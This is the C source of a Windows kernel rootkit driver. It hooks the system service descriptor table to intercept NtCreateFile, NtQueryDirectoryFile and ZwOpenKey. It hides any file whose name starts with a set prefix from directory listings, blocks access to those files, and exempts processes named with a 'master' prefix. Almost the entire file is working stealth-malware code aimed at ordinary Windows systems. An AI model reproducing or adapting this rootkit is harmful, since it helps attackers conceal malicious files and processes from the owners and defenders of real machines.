
#include <ntddk.h>
#include "rk_hook.h"
#include "rk_DKOM.h"
#include "rootkit.h"
#include "rk_Tools.h"

//
//	Native API indexes.
//

extern ROOTKIT_SETUP_DATA	offsets;
extern PMODULE_ENTRY		gp_HiddenDriver;
extern ULONG				gp_ImageDelta;

//Win2k Prof. SP4
NTAPI_LIST bn2195 = { 0xA , 0x20, 0x7D , 0xD9, 0x97};	// sprawdzic ostatnie!!!!!

//WinXP Prof. SP0
NTAPI_LIST bnXP =	{ 0xB , 0x25, 0x91 , 0xF9, 0xad};

//Win2k3 Server SP1
NTAPI_LIST bn2k3 =	{ 0xc , 0x27, 0x97 , 0x102, 0xb5}; 

//extern WCHAR hidePrefixW[];
extern UNICODE_STRING hidePrefixW;
extern char *hidePrefixA;
extern char *masterPrefix;

//extern NTQUERYDIRECTORYFILE		OrgNtQueryDirectoryFile;
NTQUERYDIRECTORYFILE		OrgNtQueryDirectoryFile = NULL;
NTCREATEFILE				OrgNtCreateFile;
NTQUERYSYSTEMINFORMATION	OrgNtQuerySystemInformation = NULL;
ZWOPENKEY                   OrgZwOpenKey;

BOOLEAN gb_ApisHooked = FALSE;

NTAPI_LIST	g_ApiList = {0};


NTSTATUS NewZwQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
);

VOID SetupIndexes()
{
	ULONG  BuildNumber;

	DbgPrint("Setting up hooking indexes");

	//no NTAPI indexes specified so choose one
	BuildNumber = (NtBuildNumber & 0x0000FFFF);
	switch (BuildNumber)
	{
	case 2195:
		g_ApiList = bn2195;
		DbgPrint("Win2k BN:2195 recongnized\n");
		break;
	case 2600:
		g_ApiList = bnXP;
		DbgPrint("WinXP BN:%d recongnized\n",BuildNumber);
		break;
	case 3790:
		g_ApiList = bn2k3;
		DbgPrint("Win2k3 BN:%d recongnized\n",BuildNumber);
		break;
	default:
		DbgPrint("OS UNSUPPORTED!!!\n");
	}
}

VOID HookApis()
{
	KIRQL tmpIrql;

	if (!gb_ApisHooked)
	{
		tmpIrql = RaiseIRQLevel();

		WPOFF();
		DbgPrint("Hooking SSD table \n");
        __asm int 3
		// NtCreateFile
		OrgNtCreateFile	= SYSCALL( g_ApiList.NtCreateFileIndex );
		SYSCALL( g_ApiList.NtCreateFileIndex ) = HookNtCreateFile;

		// NtQueryDirectoryFile
		OrgNtQueryDirectoryFile	= SYSCALL( g_ApiList.NtQueryDirectoryFileIndex );
//		SYSCALL( g_ApiList.NtQueryDirectoryFileIndex ) = HookNtQueryDirectoryFile;
		SYSCALL( g_ApiList.NtQueryDirectoryFileIndex ) = NewZwQueryDirectoryFile;

        OrgZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 
		// NtQueryDirectoryFile
//		OrgNtQuerySystemInformation	= SYSCALL( g_ApiList.NtQuerySystemInformationIndex );
//		SYSCALL( g_ApiList.NtQuerySystemInformationIndex ) = HookNtQuerySystemInformation;


		gb_ApisHooked = TRUE;
		WPON();

		LowerIRQLevel( tmpIrql );
    }
}

VOID UnHookApis()
{
	KIRQL tmpIrql;

	if (gb_ApisHooked)
	{
		// raising IRQLEVEL - this should keep race conditions away from us
		tmpIrql = RaiseIRQLevel();

		DbgPrint("Unhooking SSD table \n");
		WPOFF();

		SYSCALL( g_ApiList.NtCreateFileIndex ) = OrgNtCreateFile;	
		SYSCALL( g_ApiList.NtQueryDirectoryFileIndex ) = OrgNtQueryDirectoryFile;	
        SYSTEMSERVICE( ZwOpenKey ) = OrgZwOpenKey;
//		SYSCALL( g_ApiList.NtQuerySystemInformationIndex ) = OrgNtQuerySystemInformation;

		gb_ApisHooked = FALSE;
		WPON();

		LowerIRQLevel( tmpIrql );
	}
}

NTSTATUS 
HookZwOpenKey(
	PHANDLE phKey,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
    )
{
        int rc;
        WCHAR buf[1024]; 
        
//        DbgPrint("Entered HookZwOpenKey\n");
		/* open the key, as normal */
        rc=((ZWOPENKEY)(OrgZwOpenKey)) (
			phKey,
			DesiredAccess,
			ObjectAttributes );
			
		
//		getFullPath( buf, sizeof(buf), ObjectAttributes);
//		DbgPrint("KEY: %S\n",buf);
		
//		DbgPrint("rootkit: ZwOpenKey : rc = %x, phKey = %X\n", rc, *phKey);
      
		return rc;
}

NTSTATUS
HookNtQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    )
{
	NTSTATUS status;
	PMODULE_INFO pmKernelInfo = NULL;
	PMODULE_INFO pmRootkitInfo = NULL;
	PMODULE_LIST pModuleList = NULL;
	ULONG i;
	SHORT w_string;

	status = OrgNtQuerySystemInformation(SystemInformationClass,
											SystemInformation,
											SystemInformationLength,
											ReturnLength);

	if (SystemInformationClass == SystemModuleInformation) {		
		__asm int 3
		if (SystemInformationLength > 0) {
			DbgPrint("ReturnLength: %ld\n",ReturnLength);
			DbgPrint("OrgNtQuerySystemInformation hooked;)\n");
			pModuleList = (PMODULE_LIST)SystemInformation;
			for (i=0;i<pModuleList->d_modules; i++ ) {	
//				if (&pModuleList->a_moduleInfo[i].a_bPath[0] < &pModuleList->a_moduleInfo[i])
//					continue;
				if (pModuleList->a_moduleInfo[i].p_Base > 0 && pModuleList->a_moduleInfo[i].w_NameOffset > 0) {

					//DbgPrint("a_moduleInfo[i]: %x\n",&pModuleList->a_moduleInfo[i]);
					//DbgPrint("d_Flags: %x\n",pModuleList->a_moduleInfo[i].d_Flags);
					//DbgPrint("a_bPath: %x\n",pModuleList->a_moduleInfo[i].a_bPath);
					//DbgPrint("d_Reserved1: %x\n",pModuleList->a_moduleInfo[i].d_Reserved1);
					//DbgPrint("d_Reserved2: %x\n",pModuleList->a_moduleInfo[i].d_Reserved2);
					//DbgPrint("w_Index: %x\n",pModuleList->a_moduleInfo[i].w_Index);
					//DbgPrint("p_Base: %x\n",pModuleList->a_moduleInfo[i].p_Base);
					//DbgPrint("d_Size: %x\n",pModuleList->a_moduleInfo[i].d_Size);
					//DbgPrint("w_NameOffset: %x\n",pModuleList->a_moduleInfo[i].w_NameOffset);
					//DbgPrint("--------\n");
					if ( _stricmp( pModuleList->a_moduleInfo[i].a_bPath + pModuleList->a_moduleInfo[i].w_NameOffset, "ntoskrnl.exe") == 0) {
						pmKernelInfo = &pModuleList->a_moduleInfo[i];
					}
				}
			}
	//		pmKernelInfo = FindModuleByName( (PMODULE_LIST)SystemInformation, "ntoskrnl.exe", 12);
			//if (pmKernelInfo!=NULL) {
			//	DbgPrint("pmKernelInfo->d_Size: %ld\n",pmKernelInfo->d_Size);
			//	pmKernelInfo->d_Size = ((ULONG)gp_HiddenDriver->base - (ULONG)pmKernelInfo->p_Base)+gp_HiddenDriver->unk1;
			//	//pmKernelInfo->d_Size = pmKernelInfo->d_Size + gp_ImageDelta;
			//}
			//else
			//	DbgPrint("pmKernelInfo is NULL pointer \n");
		}
	}
		
	return status;
}
//--------------------------------------------------------------------------


NTSTATUS NewZwQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
)
{
	NTSTATUS rc;
	PCHAR processName = NULL;
	PEPROCESS currentEprocess = NULL;	
//	CHAR aProcessName[PROCNAMELEN];                                        
//		                                                                      
//	GetProcessName( aProcessName );                                        
//	DbgPrint("rootkit: NewZwQueryDirectoryFile() from %s\n", aProcessName);

	rc=OrgNtQueryDirectoryFile(
			hFile,							/* this is the directory handle */
			hEvent,
			IoApcRoutine,
			IoApcContext,
			pIoStatusBlock,
			FileInformationBuffer,
			FileInformationBufferLength,
			FileInfoClass,
			bReturnOnlyOneEntry,
			PathMask,
			bRestartQuery);

    DbgPrint("Jestem w srodku\n");

	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
	currentEprocess = PsGetCurrentProcess();
	if (IsPriviligedProcess( currentEprocess ) ) {
        DbgPrint("HookNtQueryDirectoryFile> IsPriviligedProcess == true\n");
		return rc;
	}

	if( NT_SUCCESS( rc ) && 
		(FileInfoClass == FileDirectoryInformation ||
		 FileInfoClass == FileFullDirectoryInformation ||
		 FileInfoClass == FileIdFullDirectoryInformation ||
		 FileInfoClass == FileBothDirectoryInformation ||
		 FileInfoClass == FileIdBothDirectoryInformation ||
		 FileInfoClass == FileNamesInformation )
		) 
	{
			PVOID p = FileInformationBuffer;
			PVOID pLast = NULL;
			BOOLEAN bLastOne;
			do 
			{
				bLastOne = !getDirEntryLenToNext(p,FileInfoClass);
				
				// compare directory-name prefix with '_root_' to decide if to hide or not.

				if (getDirEntryFileLength(p,FileInfoClass) >= 18) {
					if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), (PVOID)&hidePrefixW.Buffer[ 0 ], 18 ) == 18 ) 
					{
						if( bLastOne ) 
						{
							if( p == FileInformationBuffer ) rc = 0x80000006;
							else setDirEntryLenToNext(pLast,FileInfoClass, 0);
							break;
						} 
						else 
						{
							int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
							int iLeft = (ULONG)FileInformationBufferLength - iPos - getDirEntryLenToNext(p,FileInfoClass);
							RtlCopyMemory( p, (PVOID)( (char *)p + getDirEntryLenToNext(p,FileInfoClass) ), (ULONG)iLeft );
							continue;
						}
					}
				}
				pLast = p;
				p = ((char *)p + getDirEntryLenToNext(p,FileInfoClass) );
			} while( !bLastOne );
	}
	return rc;
}

//////////////////////////////////////////////////////////////////////////
//
//	Hooked NtQueryDirectoryFile
//
//	It is possible to hide some files...
//	
//////////////////////////////////////////////////////////////////////////

NTSTATUS HookNtQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery)
{
	NTSTATUS rc;
	BOOLEAN bLastOne;
	PDirEntry p;
	PDirEntry pLast;
	PCHAR processName = NULL;
	PEPROCESS currentEprocess = NULL;
	int iPos;
	int iLeft;

	rc = OrgNtQueryDirectoryFile(
			hFile,
			hEvent,
			IoApcRoutine,
			IoApcContext,
			pIoStatusBlock,
			FileInformationBuffer,
			FileInformationBufferLength,
			FileInfoClass,
			bReturnOnlyOneEntry,
			PathMask,
			bRestartQuery);
			
    if (IoApcRoutine!=NULL || hEvent != NULL) {
       DbgPrint("Leaving for kamikadze ;)\n");
       return rc;
    }
    

//    DbgPrint("Entered HookNtQueryDirectoryFile\n");

	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
	currentEprocess = PsGetCurrentProcess();
	if (IsPriviligedProcess( currentEprocess ) ) {
        DbgPrint("HookNtQueryDirectoryFile> IsPriviligedProcess == true\n");
		return rc;
	}

	if( NT_SUCCESS( rc ) ) 
	{
		PDirEntry p = (PDirEntry)FileInformationBuffer;
		PDirEntry pLast = NULL;
		BOOLEAN bLastOne;

//       	if ((FileInfoClass != FileDirectoryInformation &&
//		 FileInfoClass != FileFullDirectoryInformation &&
//		 FileInfoClass != FileIdFullDirectoryInformation &&
//		 FileInfoClass != FileBothDirectoryInformation &&
//		 FileInfoClass != FileIdBothDirectoryInformation &&
//		 FileInfoClass != FileNamesInformation ))
//		 return rc;

	    __asm int 3
		do 
		{
			bLastOne = !( p->dwLenToNext );
//			if (p->wNameLen >= 18)
				if( RtlCompareMemory( (PVOID)&p->suName[ 0 ], (PVOID)&hidePrefixW.Buffer[ 0 ], 18 ) == 18 ) 
//				if( RtlCompareMemory( (PVOID)&p->suName[ 0 ], (PVOID)&hidePrefixW[ 0 ], 18 ) == 18 ) 
				{
					DbgPrint("Should be hooked\n");
					if( bLastOne ) 
					{
						if( p == (PDirEntry)FileInformationBuffer ) rc = 0x80000006;
						else pLast->dwLenToNext = 0;
						break;
					} 
					else 
					{
						int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
						int iLeft = (ULONG)FileInformationBufferLength - iPos - p->dwLenToNext;
						RtlCopyMemory( (PVOID)p, (PVOID)( (char *)p + p->dwLenToNext ), (ULONG)iLeft );
						continue;
					}
				}
			pLast = p;
			p = (PDirEntry)((char *)p + p->dwLenToNext );
		} while( !bLastOne );
	}

	return(rc);
}



NTSTATUS HookNtCreateFile(
  PHANDLE FileHandle,
  ACCESS_MASK DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PIO_STATUS_BLOCK IoStatusBlock,
  PLARGE_INTEGER AllocationSize,
  ULONG FileAttributes,
  ULONG ShareAccess,
  ULONG CreateDisposition,
  ULONG CreateOptions,
  PVOID EaBuffer,
  ULONG EaLength
)
{

	PEPROCESS currentEprocess = NULL;

	goto pass_throught;

	currentEprocess = PsGetCurrentProcess();
	if (IsPriviligedProcess( currentEprocess ) ) {
        DbgPrint("HookNtCreateFile> IsPriviligedProcess == true\n");                             
		goto pass_throught;
	}

	if (  wcslen(hidePrefixW.Buffer ) <= ObjectAttributes->ObjectName->Length )
		if (RtlCompareMemory( ObjectAttributes->ObjectName->Buffer, hidePrefixW.Buffer, wcslen(hidePrefixW.Buffer )) ) 
//		if (wcsstr(ObjectAttributes->ObjectName->Buffer, hidePrefixW ))
		{	
			return STATUS_ACCESS_DENIED;
		}

pass_throught:

	return OrgNtCreateFile(
					FileHandle,
					DesiredAccess,
					ObjectAttributes,
					IoStatusBlock,
					AllocationSize,
					FileAttributes,
					ShareAccess,
					CreateDisposition,
					CreateOptions,
					EaBuffer,
					EaLength);
}


BOOLEAN IsPriviligedProcess( PEPROCESS eproc ) 
{
	ULONG len = 0;
	PCHAR processName = NULL;
	if ( eproc ) {
		processName = (PCHAR) ( (ULONG)eproc + offsets.nameOffset );
//		DbgPrint("CurrentEprocess: %x, processName: %x\n",eproc,processName);
		if (processName) {
			len = strlen(masterPrefix);
//			DbgPrint("Master prefix: %s, [%ld]n",masterPrefix,len);
			// WARNING MUST BE LESS THAN 16 !!!! EPROC HAVOC
			if ( RtlCompareMemory( processName, masterPrefix, len ) == len )
				return TRUE;
		}
	}
	return FALSE;
}
